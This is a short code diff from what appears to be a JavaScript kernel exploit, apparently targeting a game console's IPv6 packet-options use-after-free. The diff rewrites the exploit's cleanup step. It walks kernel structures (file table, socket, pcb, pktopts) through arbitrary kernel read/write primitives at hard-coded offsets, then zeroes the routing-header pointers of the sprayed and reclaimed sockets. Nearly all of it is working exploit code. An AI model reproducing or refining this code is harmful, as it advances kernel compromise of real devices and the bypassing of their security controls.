@@ -1499,21 +1499,31 @@ function get_sock_pktopts(sock) {
 
 try{  
 
-
-    for (let i = 0; i < sds.length; i++) {
-    const pkto = get_sock_pktopts(sds[i]);     // BigInt
-    const ptr  = pkto + off_ip6po_rthdr;       // BigInt + BigInt
-    kmem.write64(ptr, 0n);
+  for (let i = 0; i < sds.length; i++) {
+    const fd = BigInt(sds[i]);
+    
+    const filep = kmem.read64(ofiles + fd * 8n);
+ 
+    const sock   = kmem.read64(filep);
+  
+    const pcb    = kmem.read64(sock + 0x18n);
+ 
+    const pkto   = kmem.read64(pcb + 0x118n);
+   
+    kmem.write64(pkto + 0x68n, 0n);
   }
 
- {
-    const pkto = get_sock_pktopts(reclaim_sock);
-    kmem.write64(pkto + off_ip6po_rthdr, 0n);
+      {
+    const fd = BigInt(reclaim_sock);
+    const filep = kmem.read64(ofiles + fd * 8n);
+    const sock   = kmem.read64(filep);
+    const pcb    = kmem.read64(sock + 0x18n);
+    const pkto   = kmem.read64(pcb + 0x118n);
+    kmem.write64(pkto + 0x68n, 0n);
   }
 
  
-  kmem.write64(worker_pktopts + off_ip6po_rthdr, 0n);
-
+  kmem.write64(worker_pktopts + 0x68n, 0n);
  
     
 
